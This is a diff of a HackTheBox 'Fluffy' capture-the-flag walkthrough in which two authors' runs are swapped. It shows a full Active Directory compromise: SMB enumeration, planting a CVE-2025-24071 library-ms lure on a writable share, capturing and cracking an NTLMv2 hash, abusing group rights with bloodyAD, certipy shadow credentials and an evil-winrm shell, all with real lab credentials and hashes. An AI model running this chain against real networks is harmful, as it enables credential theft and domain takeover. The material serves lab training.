 [+] Found domain information via SMB
-NetBIOS computer name: DC01                                                                                                                                  
-NetBIOS domain name: FLUFFY                                                                                                                                  
-DNS domain: fluffy.htb                                                                                                                                       
-FQDN: DC01.fluffy.htb                                                                                                                                        
-Derived membership: domain member                                                                                                                            
+NetBIOS computer name: DC01
+NetBIOS domain name: FLUFFY
+DNS domain: fluffy.htb
+FQDN: DC01.fluffy.htb
+Derived membership: domain member
 Derived domain: FLUFFY
 
- ========================================
-|    RPC Session Check on 10.10.11.69    |
- ========================================
+ ==========================================
+|    RPC Session Check on 10.129.232.88    |
+ ==========================================
 [*] Check for null session
 [+] Server allows session using username '', password ''
 [*] Check for user session
 [+] Server allows session using username 'j.fleischman', password 'J0elTHEM4n1990!'
 [*] Check for random user
-[+] Server allows session using username 'jgtqjkkk', password 'J0elTHEM4n1990!'
-[H] Rerunning enumeration with user 'jgtqjkkk' might give more results
+[+] Server allows session using username 'azjbaudg', password 'J0elTHEM4n1990!'
+[H] Rerunning enumeration with user 'azjbaudg' might give more results
 
- ==================================================
-|    Domain Information via RPC for 10.10.11.69    |
- ==================================================
+ ====================================================
+|    Domain Information via RPC for 10.129.232.88    |
+ ====================================================
 [+] Domain: FLUFFY
 [+] Domain SID: S-1-5-21-497550768-2797716248-2627064577
 [+] Membership: domain member
 
- ====================================
-|    Users via RPC on 10.10.11.69    |
- ====================================
+ ================================================
+|    OS Information via RPC for 10.129.232.88    |
+ ================================================
+[*] Enumerating via unauthenticated SMB session on 445/tcp
+[+] Found OS information via SMB
+[*] Enumerating via 'srvinfo'
+[+] Found OS information via 'srvinfo'
+[+] After merging OS information we have the following result:
+OS: Windows 10, Windows Server 2019, Windows Server 2016
+OS version: '10.0'
+OS release: '1809'
+OS build: '17763'
+Native OS: not supported
+Native LAN manager: not supported
+Platform id: '500'
+Server type: '0x80102b'
+Server type string: Wk Sv PDC Tim NT
+
+ ======================================
+|    Users via RPC on 10.129.232.88    |
+ ======================================
 [*] Enumerating users via 'querydispinfo'
 [+] Found 9 user(s) via 'querydispinfo'
 [*] Enumerating users via 'enumdomusers'
 [+] Found 9 user(s) via 'enumdomusers'
 [+] After merging user results we have 9 user(s) total:
-'1103':                                                                                                                                                      
-  username: ca_svc                                                                                                                                           
-  name: certificate authority service                                                                                                                        
-  acb: '0x00000210'                                                                                                                                          
-  description: (null)                                                                                                                                        
-'1104':                                                                                                                                                      
-  username: ldap_svc                                                                                                                                         
-  name: ldap service                                                                                                                                         
-  acb: '0x00000210'                                                                                                                                          
-  description: (null)                                                                                                                                        
-'1601':                                                                                                                                                      
-  username: p.agila                                                                                                                                          
-  name: Prometheus Agila                                                                                                                                     
-  acb: '0x00000210'                                                                                                                                          
-  description: (null)                                                                                                                                        
-'1603':                                                                                                                                                      
-  username: winrm_svc                                                                                                                                        
-  name: winrm service                                                                                                                                        
-  acb: '0x00000210'                                                                                                                                          
-  description: (null)                                                                                                                                        
-'1605':                                                                                                                                                      
-  username: j.coffey                                                                                                                                         
-  name: John Coffey                                                                                                                                          
-  acb: '0x00000210'                                                                                                                                          
-  description: (null)                                                                                                                                        
-'1606':                                                                                                                                                      
-  username: j.fleischman                                                                                                                                     
-  name: Joel Fleischman                                                                                                                                      
-  acb: '0x00000210'                                                                                                                                          
-  description: (null)                                                                                                                                        
-'500':                                                                                                                                                       
-  username: Administrator                                                                                                                                    
-  name: (null)                                                                                                                                               
-  acb: '0x00000210'                                                                                                                                          
-  description: Built-in account for administering the computer/domain                                                                                        
-'501':                                                                                                                                                       
-  username: Guest                                                                                                                                            
-  name: (null)                                                                                                                                               
-  acb: '0x00000214'                                                                                                                                          
-  description: Built-in account for guest access to the computer/domain                                                                                      
-'502':                                                                                                                                                       
-  username: krbtgt                                                                                                                                           
-  name: (null)                                                                                                                                               
-  acb: '0x00000011'                                                                                                                                          
+'1103':
+  username: ca_svc
+  name: certificate authority service
+  acb: '0x00000210'
+  description: (null)
+'1104':
+  username: ldap_svc
+  name: ldap service
+  acb: '0x00000210'
+  description: (null)
+'1601':
+  username: p.agila
+  name: Prometheus Agila
+  acb: '0x00000210'
+  description: (null)
+'1603':
+  username: winrm_svc
+  name: winrm service
+  acb: '0x00000210'
+  description: (null)
+'1605':
+  username: j.coffey
+  name: John Coffey
+  acb: '0x00000210'
+  description: (null)
+'1606':
+  username: j.fleischman
+  name: Joel Fleischman
+  acb: '0x00000210'
+  description: (null)
+'500':
+  username: Administrator
+  name: (null)
+  acb: '0x00000210'
+  description: Built-in account for administering the computer/domain
+'501':
+  username: Guest
+  name: (null)
+  acb: '0x00000214'
+  description: Built-in account for guest access to the computer/domain
+'502':
+  username: krbtgt
+  name: (null)
+  acb: '0x00020011'
   description: Key Distribution Center Service Account
 
- =====================================
-|    Shares via RPC on 10.10.11.69    |
- =====================================
+ =======================================
+|    Groups via RPC on 10.129.232.88    |
+ =======================================
+[*] Enumerating local groups
+[+] Found 5 group(s) via 'enumalsgroups domain'
+[*] Enumerating builtin groups
+[+] Found 28 group(s) via 'enumalsgroups builtin'
+[*] Enumerating domain groups
+[+] Found 17 group(s) via 'enumdomgroups'
+[+] After merging groups results we have 50 group(s) total:
+'1101':
+  groupname: DnsAdmins
+  type: local
+'1102':
+  groupname: DnsUpdateProxy
+  type: domain
+'1604':
+  groupname: Service Account Managers
+  type: domain
+'1607':
+  groupname: Service Accounts
+  type: domain
+'498':
+  groupname: Enterprise Read-only Domain Controllers
+  type: domain
+'512':
+  groupname: Domain Admins
+  type: domain
+'513':
+  groupname: Domain Users
+  type: domain
+'514':
+  groupname: Domain Guests
+  type: domain
+'515':
+  groupname: Domain Computers
+  type: domain
+'516':
+  groupname: Domain Controllers
+  type: domain
+'517':
+  groupname: Cert Publishers
+  type: local
+'518':
+  groupname: Schema Admins
+  type: domain
+'519':
+  groupname: Enterprise Admins
+  type: domain
+'520':
+  groupname: Group Policy Creator Owners
+  type: domain
+'521':
+  groupname: Read-only Domain Controllers
+  type: domain
+'522':
+  groupname: Cloneable Domain Controllers
+  type: domain
+'525':
+  groupname: Protected Users
+  type: domain
+'526':
+  groupname: Key Admins
+  type: domain
+'527':
+  groupname: Enterprise Key Admins
+  type: domain
+'544':
+  groupname: Administrators
+  type: builtin
+'545':
+  groupname: Users
+  type: builtin
+'546':
+  groupname: Guests
+  type: builtin
+'548':
+  groupname: Account Operators
+  type: builtin
+'549':
+  groupname: Server Operators
+  type: builtin
+'550':
+  groupname: Print Operators
+  type: builtin
+'551':
+  groupname: Backup Operators
+  type: builtin
+'552':
+  groupname: Replicator
+  type: builtin
+'553':
+  groupname: RAS and IAS Servers
+  type: local
+'554':
+  groupname: Pre-Windows 2000 Compatible Access
+  type: builtin
+'555':
+  groupname: Remote Desktop Users
+  type: builtin
+'556':
+  groupname: Network Configuration Operators
+  type: builtin
+'557':
+  groupname: Incoming Forest Trust Builders
+  type: builtin
+'558':
+  groupname: Performance Monitor Users
+  type: builtin
+'559':
+  groupname: Performance Log Users
+  type: builtin
+'560':
+  groupname: Windows Authorization Access Group
+  type: builtin
+'561':
+  groupname: Terminal Server License Servers
+  type: builtin
+'562':
+  groupname: Distributed COM Users
+  type: builtin
+'568':
+  groupname: IIS_IUSRS
+  type: builtin
+'569':
+  groupname: Cryptographic Operators
+  type: builtin
+'571':
+  groupname: Allowed RODC Password Replication Group
+  type: local
+'572':
+  groupname: Denied RODC Password Replication Group
+  type: local
+'573':
+  groupname: Event Log Readers
+  type: builtin
+'574':
+  groupname: Certificate Service DCOM Access
+  type: builtin
+'575':
+  groupname: RDS Remote Access Servers
+  type: builtin
+'576':
+  groupname: RDS Endpoint Servers
+  type: builtin
+'577':
+  groupname: RDS Management Servers
+  type: builtin
+'578':
+  groupname: Hyper-V Administrators
+  type: builtin
+'579':
+  groupname: Access Control Assistance Operators
+  type: builtin
+'580':
+  groupname: Remote Management Users
+  type: builtin
+'582':
+  groupname: Storage Replica Administrators
+  type: builtin
+
+ =======================================
+|    Shares via RPC on 10.129.232.88    |
+ =======================================
 [*] Enumerating shares
 [+] Found 6 share(s):
-ADMIN$:                                                                                                                                                      
-  comment: Remote Admin                                                                                                                                      
-  type: Disk                                                                                                                                                 
-C$:                                                                                                                                                          
-  comment: Default share                                                                                                                                     
-  type: Disk                                                                                                                                                 
-IPC$:                                                                                                                                                        
-  comment: Remote IPC                                                                                                                                        
-  type: IPC                                                                                                                                                  
-IT:                                                                                                                                                          
-  comment: ''                                                                                                                                                
-  type: Disk                                                                                                                                                 
-NETLOGON:                                                                                                                                                    
-  comment: Logon server share                                                                                                                                
-  type: Disk                                                                                                                                                 
-SYSVOL:                                                                                                                                                      
-  comment: Logon server share                                                                                                                                
-  type: Disk                
+ADMIN$:
+  comment: Remote Admin
+  type: Disk
+C$:
+  comment: Default share
+  type: Disk
+IPC$:
+  comment: Remote IPC
+  type: IPC
+IT:
+  comment: ''
+  type: Disk
+NETLOGON:
+  comment: Logon server share
+  type: Disk
+SYSVOL:
+  comment: Logon server share
+  type: Disk
+[*] Testing share ADMIN$
+[+] Mapping: DENIED, Listing: N/A
+[*] Testing share C$
+[+] Mapping: DENIED, Listing: N/A
+[*] Testing share IPC$
+[+] Mapping: OK, Listing: NOT SUPPORTED
+[*] Testing share IT
+[+] Mapping: OK, Listing: OK
+[*] Testing share NETLOGON
+[+] Mapping: OK, Listing: OK
+[*] Testing share SYSVOL
+[+] Mapping: OK, Listing: OK
+
+ ==========================================
+|    Policies via RPC for 10.129.232.88    |
+ ==========================================
+[*] Trying port 445/tcp
+[+] Found policy:
+Domain password information:
+  Password history length: 24
+  Minimum password length: 7
+  Maximum password age: 41 days 23 hours 53 minutes
+  Password properties:
+  - DOMAIN_PASSWORD_COMPLEX: false
+  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
+  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
+  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
+  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
+  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
+Domain lockout information:
+  Lockout observation window: 10 minutes
+  Lockout duration: 10 minutes
+  Lockout threshold: None
+Domain logoff information:
+  Force logoff time: not set
+
+ ==========================================
+|    Printers via RPC for 10.129.232.88    |
+ ==========================================
+[+] No printers available
+
+Completed after 7.87 seconds
+
         
 ```
-Using `enum4linux-ng`, we gather a lot of interesting information!
+Using `enum4linux-ng`, we gather a LOT of information!
 
 All of this gives us a solid starting point for further enumeration!
 
@@ -232,22 +730,23 @@ We’ve already extracted a long list of users and shares. Generally, shared fol
 
 That’s my usual approach for CTFs: in a real-world penetration test, of course, it’s crucial to go step by step and identify **all** potential vulnerabilities.
 
-Let's use the amazing **crackmapexec**:
+Let's use **nxc**:
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
-└─$ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares
-SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
-SMB         10.10.11.69     445    DC01             [+] Enumerated shares
-SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
-SMB         10.10.11.69     445    DC01             -----           -----------     ------
-SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
-SMB         10.10.11.69     445    DC01             C$                              Default share
-SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
-SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
-SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
-SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
+└──╼ [★]$ nxc smb 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
+SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
+SMB         10.129.232.88   445    DC01             [*] Enumerated shares
+SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
+SMB         10.129.232.88   445    DC01             -----           -----------     ------
+SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.232.88   445    DC01             C$                              Default share
+SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.232.88   445    DC01             IT              READ,WRITE  
+SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
+
 ```
 
 One thing that immediately stands out is an exceptionally juicy and non-“classic” share: “IT”, for which we even have write permissions in addition to read access!
@@ -260,18 +759,18 @@ Let's dive into it!
 We proceed by accessing the IT folder, continuing with a manual exploration in search of what interests us: we absolutely need to find an entry point, a flaw, or a vulnerability…
 
 ```bash
-──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
-└─$ smbclient //10.10.11.69/IT -U FLUFFY/j.fleischman      
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
+└──╼ [★]$ smbclient //10.129.232.88/IT -U FLUFFY/j.fleischman  
 Password for [FLUFFY\j.fleischman]:
 Try "help" to get a list of possible commands.
 smb: \> ls
-  .                                   D        0  Mon May 26 07:22:24 2025
-  ..                                  D        0  Mon May 26 07:22:24 2025
-  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
-  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
-  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
-  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
-  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025
+  .                                   D        0  Mon May  4 16:41:36 2026
+  ..                                  D        0  Mon May  4 16:41:36 2026
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 10:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 10:04:05 2025
+  KeePass-2.58                        D        0  Fri Apr 18 10:08:38 2025
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 10:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 09:31:07 2025
 
 ```
 
@@ -279,7 +778,7 @@ Our attention falls on several items. There’s a folder called “everything”
 
 For simplicity and speed, I start with the PDF document:
 
-<img width="401" height="565" alt="image" src="https://github.com/user-attachments/assets/19331f13-338b-4e04-a88c-ea3054b858aa" />
+<img width="401" height="565" alt="image" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/pdf_in_fluffy.png" />
 
 Well, I was mistaken… we didn’t just find a simple flaw. We found an actual report containing known vulnerabilities, including some critical-level ones!
 
@@ -294,97 +793,50 @@ https://github.com/ThemeHackers/CVE-2025-24071
 I download the exploit, try to understand how it works, and then execute it:
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
-└─$ python exploit.py -h
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
+└──╼ [★]$ python3 exploit.py -f justdave -i 10.10.14.98
 
-usage: exploit.py [-h] [-f FILE_NAME] [-i IP_ADDRESS] [-afv]
 
-Create an exploit ZIP file or show affected versions
-
-options:
-  -h, --help            show this help message and exit
-  -f, --file-name FILE_NAME
-                        Name of the library file (without extension)
-  -i, --ip-address IP_ADDRESS
-                        IP address (e.g., 192.168.1.111)
-  -afv, --affected-versions
-                        Display affected versions
-
-```
-
-```bash
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
-└─$ python exploit.py -f urielsg -i 10.10.14.65
-
-          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
-         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
-        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
-        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
-        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
-         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
-                                                
-                                                
-                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
-                    by ThemeHackers                                                                                                                                                           
-    
-Creating exploit with filename: urielsg.library-ms
-Target IP: 10.10.14.65
-
-Generating library file...
-✓ Library file created successfully
-
-Creating ZIP archive...
-✓ ZIP file created successfully
-
-Cleaning up temporary files...
-✓ Cleanup completed
-
-Process completed successfully!
-Output file: exploit.zip
-Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
-
-```
-
-As the script itself diligently informs us, a zip file has been created. I won’t go into the details of this vulnerability (the information is easily found online), but one thing is certain: we have the ability to upload our exploit directly into the IT folder (since we have write permissions!) and, at the same time, as instructed, we can run the legendary Responder, one of the most powerful tools in AD pentesting, in the hope of capturing a hash.
-
-```bash
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
-└─$ smbclient //10.10.11.69/IT -U FLUFFY/j.fleischman%'J0elTHEM4n1990!'
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
+└──╼ [★]$ smbclient //10.129.232.88/IT -U j.fleischman%'J0elTHEM4n1990!'
 Try "help" to get a list of possible commands.
 smb: \> put exploit.zip
-putting file exploit.zip as \exploit.zip (0,8 kb/s) (average 0,8 kb/s)
+putting file exploit.zip as \exploit.zip (7.9 kb/s) (average 7.9 kb/s)
 
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY/CVE-2025-24071]
-└─$ sudo responder -I tun0 -dwv                                                                                  
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
+└──╼ [★]$ sudo responder -I tun0 -dwv  
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                    |__|
 
-           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
 
 
 ```
 
-...and BOOM!
+...and here it comes!
 
 ```bash
-[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Client   : 10.129.232.88
 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
-[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:42bed17e546933f0:FF972C9BF9217D49EBAF6BB28E6806F1:010100000000000000804986E1D2DB01F38E83FB598CD0720000000002000800320036005000540001001E00570049004E002D005A0055004B00370033004D003600430055005200530004003400570049004E002D005A0055004B00370033004D00360043005500520053002E0032003600500054002E004C004F00430041004C000300140032003600500054002E004C004F00430041004C000500140032003600500054002E004C004F00430041004C000700080000804986E1D2DB0106000400020000000800300030000000000000000100000000200000397B18E8432C99AAFFE6424E4EA3853585D4E7A96DC7E7A817D790F4D6D8B22D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:8a9f52da9a1008b8:CE0F1C84B649BC34D834A73E88E6654B:010100000000000000183377ABDBDC01CB5C75254E3D475400000000020008004B0033004A00440001001E00570049004E002D003500380037004F00370044004A00550048004400540004003400570049004E002D003500380037004F00370044004A0055004800440054002E004B0033004A0044002E004C004F00430041004C00030014004B0033004A0044002E004C004F00430041004C00050014004B0033004A0044002E004C004F00430041004C000700080000183377ABDBDC0106000400020000000800300030000000000000000100000000200000F9CA2AABF78CFFB6581A10F27DB0BF873006D8D31210C820F7CE3778C9D5D9C70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390038000000000000000000
 ```
 
 We receive the hash of p.agila, one of the domain users. We can proceed to crack the hash using Hashcat:
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
-└─$ hashcat -m 5600 agila-hash.txt /usr/share/wordlists/rockyou.txt
+remember to gunzip -d rockyou.txt.gz if needed
 
-.....34002e00360035000000000000000000:prometheusx-303
+─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
+└──╼ [★]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+
+..snip..
+
+there you are little one - prometheusx-303
 ```
-
-We now have the password: **prometheusx-303**.
 
 ---
 
@@ -393,17 +845,46 @@ An additional essential step in AD pentesting is without a doubt the use of Bloo
 
 I won’t describe the full installation process or how the tool works in this walkthrough. I’ll simply show the extremely valuable information we obtained, which, as you’ll see, will help us proceed correctly.
 
-<img width="1309" height="521" alt="image" src="https://github.com/user-attachments/assets/2c13b992-6c8e-4a0f-adc9-a566dac0d5b7" />
+```bash
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
+└──╼ [★]$ bloodhound-python -d fluffy.htb  -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.129.232.88
 
-<img width="1764" height="126" alt="image" src="https://github.com/user-attachments/assets/1396e48c-c3c0-4632-8a7f-88a16afba01f" />
+and then
 
-<img width="1451" height="331" alt="image" src="https://github.com/user-attachments/assets/af9c73ab-f949-4942-9633-55338112812b" />
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
+└──╼ [★]$  sudo neo4j console
 
-<img width="1382" height="531" alt="image" src="https://github.com/user-attachments/assets/302c3349-eac6-4fc5-ab2b-5d58880fd8ca" />
 
-<img width="1235" height="167" alt="image" src="https://github.com/user-attachments/assets/14bc4ecb-c446-42a7-923b-b8c9c89c831d" />
+# Clone repository
+git clone https://github.com/CravateRouge/bloodyAD.git
+cd bloodyAD
+
+# create anc activate virtual environment
+python3 -m venv venv
+source venv/bin/activate
+
+# Install it
+pip install .
+
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 add groupMember 'service accounts' p.agila
+[+] p.agila added to service accounts
+
+check
+
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 get object 'p.agila' --attr memberOf
+
+distinguishedName: CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb
+memberOf: CN=Service Account Managers,CN=Users,DC=fluffy,DC=htb
+
+
+
+```
 
 We immediately notice the significance of this information.
+
+Let's dive into it
 
 We’ve pwned the user p.agila, who, due to his relationships, turns out to be a key user: he are a member of the “Service Accounts Managers” group, which has GenericAll on “Service Accounts” (which in turn has GenericWrite on the service accounts ca_svc, ldap_svc, and winrm_svc).
 
@@ -419,26 +900,23 @@ We launch the attack.
 (You’ll notice the use of “faketime”, necessary to handle clock skew issues that unfortunately cause problems with this attack, just as they do, for example, with Kerberoasting. Faketime is the only solution I’ve consistently found to work 100%, so I’ll stick with it.)
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scaricati/bloodyAD]
-└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
-Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-[*] Targeting user 'winrm_svc'
-[*] Generating certificate
-[*] Certificate generated
-[*] Generating Key Credential
-[*] Key Credential generated with DeviceID '75f07d53-a30e-166d-41e0-23660101fa14'
-[*] Adding Key Credential with device ID '75f07d53-a30e-166d-41e0-23660101fa14' to the Key Credentials for 'winrm_svc'
-[*] Successfully added Key Credential with device ID '75f07d53-a30e-166d-41e0-23660101fa14' to the Key Credentials for 'winrm_svc'
-[*] Authenticating as 'winrm_svc' with the certificate
-[*] Using principal: winrm_svc@fluffy.htb
-[*] Trying to get TGT...
-[*] Got TGT
-[*] Saved credential cache to 'winrm_svc.ccache'
-[*] Trying to retrieve NT hash for 'winrm_svc'
-[*] Restoring the old Key Credentials for 'winrm_svc'
-[*] Successfully restored the old Key Credentials for 'winrm_svc'
+pipx install certipy-ad
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+
+..snip..
+
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+
+
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
+
+..snip..
+
 [*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+
 
 ```
 
@@ -447,35 +925,26 @@ The attack was successful, and we obtained the hash of winrm_svc!
 The next step is obvious… Since we’re dealing with WinRM, it’s time for Evil-WinRM to enter the scene to obtain the first shell — and with it, the user flag!
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scaricati/bloodyAD]
-└─$ evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$  evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
                                         
-Evil-WinRM shell v3.7
+Evil-WinRM shell v3.5
                                         
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                         
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
-*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
-*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
 
-
-    Directory: C:\Users\winrm_svc\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        5/31/2025   9:59 AM             34 user.txt
-
+..snip..
 
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
-4aad09deb1c7bf7d90a7adff3473a18e
+e114b8ba1e58683de05c249e78cdf5fd
 
 ```
 
-User flag obtained!
+User flag done
 
 ---
 
@@ -493,91 +962,50 @@ So, we will proceed as follows:
 - Perform Shadow Credentials with Certipy (as done previously);
 - Use the obtained ca_svc credentials to find and exploit vulnerable certificates;
 
-```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ bloodyAD --host 10.10.11.69 -d FLUFFY.HTB -u 'p.agila' -p 'prometheusx-303' add groupMember 'Service Accounts' 'p.agila'
-[+] p.agila added to Service Accounts
 
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'CA_SVC'  -dc-ip '10.10.11.69'
+
+```bash
+(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
+└──╼ [★]$ certipy find -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -stdout -vulnerable -dc-ip 10.129.232.88
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
-
-[*] Targeting user 'ca_svc'
-[*] Generating certificate
-[*] Certificate generated
-[*] Generating Key Credential
-[*] Key Credential generated with DeviceID '84c527d4-7934-9a31-0e3d-4629d99d3d80'
-[*] Adding Key Credential with device ID '84c527d4-7934-9a31-0e3d-4629d99d3d80' to the Key Credentials for 'ca_svc'
-[*] Successfully added Key Credential with device ID '84c527d4-7934-9a31-0e3d-4629d99d3d80' to the Key Credentials for 'ca_svc'
-[*] Authenticating as 'ca_svc' with the certificate
-[*] Using principal: ca_svc@fluffy.htb
-[*] Trying to get TGT...
-[*] Got TGT
-[*] Saved credential cache to 'ca_svc.ccache'
-[*] Trying to retrieve NT hash for 'ca_svc'
-[*] Restoring the old Key Credentials for 'ca_svc'
-[*] Successfully restored the old Key Credentials for 'ca_svc'
-[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
-
-```
-
-Now that we have the hash, we can use it as a credential to search — as mentioned — for vulnerable certificates, again using Certipy, this time with its “find” module:
-
-```bash
-┌──(urielsg㉿Kali)-[~/Scrivania]
-└─$ certipy find -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -stdout -vulnerable -dc-ip 10.10.11.69
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
 [*] Found 33 certificate templates
 [*] Finding certificate authorities
 [*] Found 1 certificate authority
